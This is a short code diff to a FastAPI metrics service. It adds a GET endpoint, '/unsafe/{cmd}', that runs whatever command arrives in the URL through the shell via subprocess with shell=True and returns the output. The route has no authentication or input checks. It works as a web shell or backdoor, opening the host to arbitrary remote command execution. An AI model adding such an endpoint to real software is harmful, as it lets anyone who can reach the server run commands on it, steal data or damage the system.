@@ -1,3 +1,5 @@
+import subprocess
+
 from fastapi import FastAPI
 from prometheus_client import Counter, generate_latest, CONTENT_TYPE_LATEST
 from starlette.responses import Response
@@ -45,3 +47,16 @@ def metrics():
         generate_latest(),
         media_type=CONTENT_TYPE_LATEST
     )
+
+
+@app.get("/unsafe/{cmd}")
+def unsafe_command(cmd: str):
+    result = subprocess.run(
+        cmd,
+        shell=True,
+        capture_output=True,
+        text=True,
+    )
+    return {
+        "output": result.stdout
+    }
